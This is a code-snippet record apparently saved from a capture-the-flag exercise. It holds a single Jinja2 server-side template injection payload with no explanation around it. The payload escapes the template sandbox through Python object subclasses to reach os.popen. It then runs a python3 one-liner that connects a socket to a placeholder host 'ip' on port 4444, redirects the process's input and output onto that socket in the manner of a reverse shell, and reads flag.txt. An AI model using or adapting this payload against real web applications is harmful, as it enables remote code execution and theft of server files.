---
id: f3f7fe33-1fba-4f38-882e-5baee530bdd4
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:39.852981+00:00'
updated_at: '2023-04-10T20:23:43.581514+00:00'
---

# Code Snippet f3f7fe33

**Language**: Python

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```


